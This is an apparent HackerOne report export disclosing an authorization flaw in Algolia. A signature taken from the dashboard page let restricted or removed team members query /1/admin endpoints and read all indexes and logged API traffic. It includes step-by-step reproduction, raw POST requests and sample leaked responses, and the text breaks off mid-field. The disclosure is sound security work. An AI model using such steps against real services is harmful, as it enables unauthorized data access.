{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-10-28T16:43:06.834Z", 
    "voters": [
        "yaworsk", 
        "bogdantcaciuc", 
        "malcolmx", 
        "madrobot", 
        "dilawer01", 
        "mpz", 
        "fantam1", 
        "alfredsaonoy", 
        "paresh_parmar", 
        "japz", 
        "and 4 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "400.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 156520, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Unauthorized team members can leak information and see all API calls through /1/admin/* endpoints, even after they have been removed.", 
    "is_member_of_team?": null, 
    "vote_count": 14, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-11-27T16:43:06.864Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$400", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-08-05T12:07:38.924Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-05T12:07:38.924Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Thank you for the report. We're evaluating the impact.", 
            "markdown_message": "<p>Thank you for the report. We&#39;re evaluating the impact.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1108205, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-30T20:37:49.661Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-30T20:37:49.661Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Hey there @adams, any news on this one?", 
            "markdown_message": "<p>Hey there <a href=\"/adams\">@adams</a>, any news on this one?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1163316, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-07T14:23:20.631Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-07T14:23:20.631Z", 
            "actor": {
                "username": "adams", 
                "url": "/adams", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/012/053/674321f512b07d0b8c75f9180c1fce11d8c257a6_medium.jpg?1438507587"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Sorry, no updates. We have a solution is development but the proper fixed turned out to be more complex and requires more time.", 
            "markdown_message": "<p>Sorry, no updates. We have a solution is development but the proper fixed turned out to be more complex and requires more time.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1237261, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-26T08:20:44.762Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-26T08:20:44.762Z", 
            "actor": {
                "username": "alem", 
                "url": "/alem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/059/58ed9eae18828f426d187ad4d45e0c98b85298e5_medium.jpeg?1446644557"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Hi @eboda.\n\nThanks for waiting. The issue described in this report took a bit of time to fix but it should now be resolved.\n\nCan you please confirm ?", 
            "markdown_message": "<p>Hi <a href=\"/eboda\">@eboda</a>.</p>\n\n<p>Thanks for waiting. The issue described in this report took a bit of time to fix but it should now be resolved.</p>\n\n<p>Can you please confirm ?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1268229, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-26T09:32:34.288Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-26T09:32:34.288Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Hey @alexandremeunier ,\n\nNo problem and yep, the issue seems to be fixed now!", 
            "markdown_message": "<p>Hey <a href=\"/alexandremeunier\">@alexandremeunier</a> ,</p>\n\n<p>No problem and yep, the issue seems to be fixed now!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1268340, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-26T10:10:58.300Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-26T10:10:58.300Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Actually there is a related issue with the Monitoring API key:\nOnce a user is invited into the team and has access to it, it can not be revoked or regenerated anymore even if the user is removed from the team. ", 
            "markdown_message": "<p>Actually there is a related issue with the Monitoring API key:<br>\nOnce a user is invited into the team and has access to it, it can not be revoked or regenerated anymore even if the user is removed from the team. </p>\n", 
            "type": "Activities::Comment", 
            "id": 1268405, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "eboda", 
                "url": "/eboda"
            }, 
            "created_at": "2016-10-28T15:56:13.138Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-28T15:56:13.138Z", 
            "actor": {
                "username": "alem", 
                "url": "/alem", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/043/059/58ed9eae18828f426d187ad4d45e0c98b85298e5_medium.jpeg?1446644557"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "This is a duplicate of another report so I'm just going to go ahead and close this one. Many thanks for your help @eboda ", 
            "markdown_message": "<p>This is a duplicate of another report so I&#39;m just going to go ahead and close this one. Many thanks for your help <a href=\"/eboda\">@eboda</a> </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1273028, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-10-28T15:56:34.383Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-28T15:56:34.383Z", 
            "actor": {
                "url": "/algolia", 
                "profile": {
                    "name": "Algolia"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/443/aea99e8de90abf447f941c9a7936ead51a6ee03f_medium.png?1501262446"
                }
            }, 
            "team_handle": "algolia", 
            "bounty_amount": "400.0", 
            "collaborator": {
                "username": "eboda", 
                "url": "/eboda"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1273029, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-28T16:42:35.636Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-28T16:42:35.636Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "message": "Awesome, thanks for the bounty! Do you mind disclosing this report?", 
            "markdown_message": "<p>Awesome, thanks for the bounty! Do you mind disclosing this report?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1273104, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-10-28T16:43:06.850Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-10-28T16:43:06.850Z", 
            "actor": {
                "username": "eboda", 
                "url": "/eboda", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/014/247/d7776229fda51a883d9c330038262d2272fe2360_medium.png?1515881564"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "algolia", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1273106, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-11-27T16:43:28.848Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-11-27T16:43:28.848Z", 
            "actor": {
                "url": "/algolia", 
                "profile": {
                    "name": "Algolia"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/443/aea99e8de90abf447f941c9a7936ead51a6ee03f_medium.png?1501262446"
                }
            }, 
            "team_handle": "algolia", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1321798, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "eboda", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/eboda", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/014/247/f5d06f8f31212f1fcbe5f517ca4059566ca97553_small.png?1515881564"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 27, 
        "name": "Improper Authentication - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -63871407.018598154, 
    "disclosed_at": "2016-11-27T16:43:28.832Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/156520", 
    "created_at": "2016-08-04T15:26:03.980Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"summary\">Summary</h2>\n\n<p>Invited team members or collaborators on <a title=\"https://www.algolia.com/manage/applications/%5BAPP_ID%5D/team\" href=\"/redirect?signature=ddcaa8471207782d70e832e5d19c181296687049&amp;url=https%3A%2F%2Fwww.algolia.com%2Fmanage%2Fapplications%2F%255BAPP_ID%255D%2Fteam\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.algolia.com/manage/applications/%5BAPP_ID%5D/team</span><i class=\"icon-external-link\"></i></a> can use the <code>/1/admin/*</code> REST endpoints to leak some information, which they should not be able to have access to.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n\n<ol>\n<li>Invite a new team member to your application and give him very restrictive rights. In my case I gave him  only <code>Search</code> rights and limited his access to an index called <code>test</code>.</li>\n<li>Login as the new team member and go to <a title=\"https://www.aloglia.com/dashboard\" href=\"/redirect?signature=3535009dfda260ba129d428dde32607bc96e1ad2&amp;url=https%3A%2F%2Fwww.aloglia.com%2Fdashboard\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.aloglia.com/dashboard</span><i class=\"icon-external-link\"></i></a> . You will be greeted with a <code>You don&#39;t have access to the Algolia Dashboard.</code> error message.</li>\n<li>\n<p>Check in the page source for <code>signature</code> and copy its value, for example on my application it was <code>fd283b81b38fb9c547fcf2bea763d547e66644839e896e877382b1fcfe598bac</code>.</p>\n\n<p>Using this signature, you can perform queries now against <code>/1/admin/*</code>, even though you don&#39;t have the rights.</p>\n</li>\n</ol>\n\n<h2 id=\"1-admin-listindexes\">/1/admin/listIndexes</h2>\n\n<p>The following request will list all indexes of the application including their statistics:</p>\n<pre class=\"highlight plaintext\"><code>POST /1/admin/listindexes HTTP/1.1\nHost: c5-eu-1.algolianet.com\n....\n\n{&quot;applicationID&quot;:&quot;APP_ID&quot;,&quot;signature&quot;:&quot;SIGNATURE&quot;,&quot;page&quot;:0,&quot;sortByNbEntries&quot;:1}\n</code></pre>\n<p>Of course you need to replace <code>applicationID</code> and <code>signature</code> with your own values from above.</p>\n\n<h2 id=\"1-admin-userlogs\">/1/admin/userlogs</h2>\n\n<p>An even more interesting endpoint. Here you can see all past queries made to the application. This includes search queries, records added and deleted, indeces created and removed, etc. for all indeces in the application. This basically leaks data from any index.</p>\n<pre class=\"highlight plaintext\"><code>POST /1/admin/userlogs HTTP/1.1\nHost: c5-eu-1.algolianet.com\n....\n\n{&quot;applicationID&quot;:&quot;APP_ID&quot;,&quot;signature&quot;:&quot;SIGNATURE&quot;,&quot;offset&quot;:0,&quot;length&quot;:1000,&quot;type&quot;:&quot;all&quot;}\n</code></pre>\n<p>This will return the whole request body and the whole response body for each query! So for example if somebody performed a search, the attacker will be able to see the whole result of the search in the response body. </p>\n\n<p>Here are two example responses, one for searching and the other for adding a record:</p>\n\n<p><strong>Searching</strong> (as you can see <code>answer</code> contains the whole record)</p>\n<pre class=\"highlight javascript\"><code><span class=\"p\">{</span>\n                <span class=\"s2\">&quot;timestamp&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;2016-08-04T15:15:01Z&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;method&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;answer_code&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;200&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;query_body&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;\\n{\\n  \\&quot;params\\&quot;: \\&quot;query=Monica&amp;page=0&amp;getRankingInfo=1&amp;facets=*&amp;attributesToRetrieve=*&amp;highlightPreTag=%3Cem%3E&amp;highlightPostTag=%3C%2Fem%3E&amp;hitsPerPage=10&amp;facetFilters=%5B%5D&amp;maxValuesPerFacet=100\\&quot;\\n}\\n&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;answer&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;\\n{\\n  \\&quot;hits\\&quot;: [\\n    {\\n      \\&quot;name\\&quot;: \\&quot;Monica Bellucci\\&quot;,\\n      \\&quot;rating\\&quot;: 3956,\\n      \\&quot;image_path\\&quot;: \\&quot;/z3sLuRKP7hQVrvSTsqdLjGSldwG.jpg\\&quot;,\\n      \\&quot;alternative_name\\&quot;: \\&quot;Monica Anna Maria Bellucci\\&quot;,\\n      \\&quot;objectID\\&quot;: \\&quot;5\\&quot;,\\n      \\&quot;_highlightResult\\&quot;: {\\n        \\&quot;name\\&quot;: {\\n          \\&quot;value\\&quot;: \\&quot;&lt;em&gt;Monica&lt;/em&gt; Bellucci\\&quot;,\\n          \\&quot;matchLevel\\&quot;: \\&quot;full\\&quot;,\\n          \\&quot;fullyHighlighted\\&quot;: false,\\n          \\&quot;matchedWords\\&quot;: [\\n            \\&quot;monica\\&quot;\\n          ]\\n        },\\n        \\&quot;alternative_name\\&quot;: {\\n          \\&quot;value\\&quot;: \\&quot;&lt;em&gt;Monica&lt;/em&gt; Anna Maria Bellucci\\&quot;,\\n          \\&quot;matchLevel\\&quot;: \\&quot;full\\&quot;,\\n          \\&quot;fullyHighlighted\\&quot;: false,\\n          \\&quot;matchedWords\\&quot;: [\\n            \\&quot;monica\\&quot;\\n          ]\\n        }\\n      },\\n      \\&quot;_rankingInfo\\&quot;: {\\n        \\&quot;nbTypos\\&quot;: 0,\\n        \\&quot;firstMatchedWord\\&quot;: 0,\\n        \\&quot;proximityDistance\\&quot;: 0,\\n        \\&quot;userScore\\&quot;: 499,\\n        \\&quot;geoDistance\\&quot;: 0,\\n        \\&quot;geoPrecision\\&quot;: 1,\\n        \\&quot;nbExactWords\\&quot;: 0,\\n        \\&quot;words\\&quot;: 1,\\n        \\&quot;filters\\&quot;: 0\\n      }\\n    }\\n  ],\\n  \\&quot;nbHits\\&quot;: 1,\\n  \\&quot;page\\&quot;: 0,\\n  \\&quot;nbPages\\&quot;: 1,\\n  \\&quot;hitsPerPage\\&quot;: 10,\\n  \\&quot;processingTimeMS\\&quot;: 1,\\n  \\&quot;facets\\&quot;: {\\n  },\\n  \\&quot;exhaustiveFacetsCount\\&quot;: true,\\n  \\&quot;query\\&quot;: \\&quot;Monica\\&quot;,\\n  \\&quot;params\\&quot;: \\&quot;query=Monica&amp;page=0&amp;getRankingInfo=1&amp;facets=*&amp;attributesToRetrieve=*&amp;highlightPreTag=%3Cem%3E&amp;highlightPostTag=%3C%2Fem%3E&amp;hitsPerPage=10&amp;facetFilters=%5B%5D&amp;maxValuesPerFacet=100\\&quot;,\\n  \\&quot;serverUsed\\&quot;: \\&quot;c5-eu-3.algolia.net\\&quot;,\\n  \\&quot;parsedQuery\\&quot;: \\&quot;monica\\&quot;,\\n  \\&quot;timeoutCounts\\&quot;: false,\\n  \\&quot;timeoutHits\\&quot;: false\\n}\\n&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;url&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;/1/indexes/QQQQQQQQ/query?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1&amp;x-algolia-application-id=5QA3U6N0QN&amp;x-algolia-api-key=3f30****************************&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;ip&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;....&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;query_headers&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;...&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;sha1&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;70a7baf41d4756ad3a01199f336d7c45b9624305&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;nb_api_calls&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;1&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;processing_time_ms&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;1&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;index&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;QQQQQQQQ&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;query_params&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;query=Monica&amp;page=0&amp;getRankingInfo=1&amp;facets=*&amp;attributesToRetrieve=*&amp;highlightPreTag=%3Cem%3E&amp;highlightPostTag=%3C%2Fem%3E&amp;hitsPerPage=10&amp;facetFilters=%5B%5D&amp;maxValuesPerFacet=100&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;query_nb_hits&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;1&quot;</span>\n            <span class=\"p\">}</span>\n</code></pre>\n<p><strong>Adding a record</strong></p>\n<pre class=\"highlight javascript\"><code> <span class=\"p\">{</span>\n                <span class=\"s2\">&quot;timestamp&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;2016-08-04T15:14:56Z&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;method&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;POST&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;answer_code&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;201&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;query_body&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;\\n{\\n  \\&quot;name\\&quot;: \\&quot;Just a test\\&quot;,\\n  \\&quot;rating\\&quot;: 1337,\\n  \\&quot;image_path\\&quot;: \\&quot;Record added\\&quot;,\\n  \\&quot;alternative_name\\&quot;: \\&quot;Everything leaked\\&quot;,\\n  \\&quot;objectID\\&quot;: \\&quot;5111\\&quot;\\n}\\n&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;answer&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;\\n{\\n  \\&quot;createdAt\\&quot;: \\&quot;2016-08-04T15:14:56.405Z\\&quot;,\\n  \\&quot;taskID\\&quot;: 18077851,\\n  \\&quot;objectID\\&quot;: \\&quot;5111\\&quot;\\n}\\n&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;url&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;/1/indexes/QQQQQQQQ?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1&amp;x-algolia-application-id=****&amp;x-algolia-api-key=3f30****************************&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;ip&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;xxxxx&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;query_headers&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;...&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;sha1&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;ee9f6ad7345be899f3a81b0b150bb75c9abc46e3&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;nb_api_calls&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;1&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;processing_time_ms&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;1&quot;</span><span class=\"p\">,</span>\n                <span class=\"s2\">&quot;index&quot;</span><span class=\"p\">:</span> <span class=\"s2\">&quot;QQQQQQQQ&quot;</span>\n            <span class=\"p\">}</span>\n</code></pre>\n<p>Clearly, the attacker can dump all indeces if he just goes back far enough where they were created.</p>\n\n<p>The other two endpoints I found are <code>/1/admin/stats/INDEXNAME</code>, which returns the same as <code>/1/admin/listIndexes</code>, but only for one specific index and <code>/1/admin/building</code>, which purpose I didn&#39;t quite figure out.</p>\n\n<h2 id=\"final-note\">Final note</h2>\n\n<p>Note that the signature is application specific and completely API key independent.</p>\n\n<p>For one that means, if I use the users API key to list indexes via <code>/1/indexes</code> endpoint, it will only return an answer if I ahve given the user <code>listIndexes</code> rights and it will only return those indeces he has access to. Whereas with the signature the users rights are completely ignored.</p>\n\n<p>It also means though, that if I remove an old team member he still continues to have access to the above endpoints. Even if the admin regenrates the admin API key, the signature remains the same. Therefore, once a team member obtained the signature, he will have access indefinitely to the application. The owner can&#39;t do anything as far as I can tell.</p>\n", 
    "vulnerability_information": "Summary\n-------------\n\nInvited team members or collaborators on https://www.algolia.com/manage/applications/[APP_ID]/team can use the `/1/admin/*` REST endpoints to leak some information, which they should not be able to have access to.\n\nSteps to reproduce\n--------------\n\n1. Invite a new team member to your application and give him very restrictive rights. In my case I gave him  only `Search` rights and limited his access to an index called `test`.\n2. Login as the new team member and go to https://www.aloglia.com/dashboard . You will be greeted with a `You don't have access to the Algolia Dashboard.` error message.\n3. Check in the page source for `signature` and copy its value, for example on my application it was `fd283b81b38fb9c547fcf2bea763d547e66644839e896e877382b1fcfe598bac`.\n\n    Using this signature, you can perform queries now against `/1/admin/*`, even though you don't have the rights.\n\n/1/admin/listIndexes\n---------------\n\nThe following request will list all indexes of the application including their statistics:\n\n```\nPOST /1/admin/listindexes HTTP/1.1\nHost: c5-eu-1.algolianet.com\n....\n\n{\"applicationID\":\"APP_ID\",\"signature\":\"SIGNATURE\",\"page\":0,\"sortByNbEntries\":1}\n```\n\nOf course you need to replace `applicationID` and `signature` with your own values from above.\n\n/1/admin/userlogs\n-----------------\n\nAn even more interesting endpoint. Here you can see all past queries made to the application. This includes search queries, records added and deleted, indeces created and removed, etc. for all indeces in the application. This basically leaks data from any index.\n\n```\nPOST /1/admin/userlogs HTTP/1.1\nHost: c5-eu-1.algolianet.com\n....\n\n{\"applicationID\":\"APP_ID\",\"signature\":\"SIGNATURE\",\"offset\":0,\"length\":1000,\"type\":\"all\"}\n```\n\nThis will return the whole request body and the whole response body for each query! So for example if somebody performed a search, the attacker will be able to see the whole result of the search in the response body. \n\nHere are two example responses, one for searching and the other for adding a record:\n\n**Searching** (as you can see `answer` contains the whole record)\n```{js}\n{\n                \"timestamp\": \"2016-08-04T15:15:01Z\",\n                \"method\": \"POST\",\n                \"answer_code\": \"200\",\n                \"query_body\": \"\\n{\\n  \\\"params\\\": \\\"query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100\\\"\\n}\\n\",\n                \"answer\": \"\\n{\\n  \\\"hits\\\": [\\n    {\\n      \\\"name\\\": \\\"Monica Bellucci\\\",\\n      \\\"rating\\\": 3956,\\n      \\\"image_path\\\": \\\"/z3sLuRKP7hQVrvSTsqdLjGSldwG.jpg\\\",\\n      \\\"alternative_name\\\": \\\"Monica Anna Maria Bellucci\\\",\\n      \\\"objectID\\\": \\\"5\\\",\\n      \\\"_highlightResult\\\": {\\n        \\\"name\\\": {\\n          \\\"value\\\": \\\"<em>Monica</em> Bellucci\\\",\\n          \\\"matchLevel\\\": \\\"full\\\",\\n          \\\"fullyHighlighted\\\": false,\\n          \\\"matchedWords\\\": [\\n            \\\"monica\\\"\\n          ]\\n        },\\n        \\\"alternative_name\\\": {\\n          \\\"value\\\": \\\"<em>Monica</em> Anna Maria Bellucci\\\",\\n          \\\"matchLevel\\\": \\\"full\\\",\\n          \\\"fullyHighlighted\\\": false,\\n          \\\"matchedWords\\\": [\\n            \\\"monica\\\"\\n          ]\\n        }\\n      },\\n      \\\"_rankingInfo\\\": {\\n        \\\"nbTypos\\\": 0,\\n        \\\"firstMatchedWord\\\": 0,\\n        \\\"proximityDistance\\\": 0,\\n        \\\"userScore\\\": 499,\\n        \\\"geoDistance\\\": 0,\\n        \\\"geoPrecision\\\": 1,\\n        \\\"nbExactWords\\\": 0,\\n        \\\"words\\\": 1,\\n        \\\"filters\\\": 0\\n      }\\n    }\\n  ],\\n  \\\"nbHits\\\": 1,\\n  \\\"page\\\": 0,\\n  \\\"nbPages\\\": 1,\\n  \\\"hitsPerPage\\\": 10,\\n  \\\"processingTimeMS\\\": 1,\\n  \\\"facets\\\": {\\n  },\\n  \\\"exhaustiveFacetsCount\\\": true,\\n  \\\"query\\\": \\\"Monica\\\",\\n  \\\"params\\\": \\\"query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100\\\",\\n  \\\"serverUsed\\\": \\\"c5-eu-3.algolia.net\\\",\\n  \\\"parsedQuery\\\": \\\"monica\\\",\\n  \\\"timeoutCounts\\\": false,\\n  \\\"timeoutHits\\\": false\\n}\\n\",\n                \"url\": \"/1/indexes/QQQQQQQQ/query?x-algolia-agent=Algolia%20for%20vanilla%20JavaScript%203.14.1&x-algolia-application-id=5QA3U6N0QN&x-algolia-api-key=3f30****************************\",\n                \"ip\": \"....\",\n                \"query_headers\": \"...\",\n                \"sha1\": \"70a7baf41d4756ad3a01199f336d7c45b9624305\",\n                \"nb_api_calls\": \"1\",\n                \"processing_time_ms\": \"1\",\n                \"index\": \"QQQQQQQQ\",\n                \"query_params\": \"query=Monica&page=0&getRankingInfo=1&facets=*&attributesToRetrieve=*&highlightPreTag=%3Cem%3E&highlightPostTag=%3C%2Fem%3E&hitsPerPage=10&facetFilters=%5B%5D&maxValuesPerFacet=100\",\n                \"query_nb_hits\": \"1\"\n            }\n```\n**Adding a record**\n```{js}\n {\n                \"timestamp\": \"2016-08-04T15:14:56Z\",\n                \"method\": \"POST\",\n                \"answer_code\": \"201\",\n                \"query_body\": \"\\n{\\n  \\\"name\\\": \\\"Just a test\\\",\\n  \\\"rating\\\": 1337,\\n  \\\"image_path\\\": \\\"Record added\\\",\\n  \\\"alternative_name\\\": \\\"Everything leaked\\\",\\n  \\\"objectID\\\": \\\"5111\\\"\\n}\\n\",\n                \"answer\": \"\\n{\\n  \\\"createdAt\\\": \\\"2016-08-04T15:14:56.405Z\\\",\\n  \\\"taskID\\\": 18077851,\\n  \\\"objectID\\\": \\\"5111\\\"\\n}\\n\",\n                \"url\": 